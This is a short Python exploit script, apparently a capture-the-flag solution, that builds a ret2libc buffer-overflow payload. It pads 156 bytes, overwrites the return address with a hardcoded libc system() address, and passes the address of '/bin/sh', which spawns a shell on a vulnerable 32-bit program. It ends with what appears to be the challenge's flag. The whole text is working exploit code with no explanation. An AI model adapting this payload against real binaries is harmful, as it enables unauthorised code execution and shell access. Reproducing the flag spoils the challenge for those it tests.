 import struct
 payload = 'A' * 156
 payload += "\x90\x31\xe6\xb7" #address of system in libc
 payload += 'A' * 4 #junk for return address in x86 calling convention
 payload += "\x24\x3a\xf8\xb7" #address of /bin/sh in libc
 print(payload)
#s0m3tim3s_r3t2libC_1s_3n0ugh
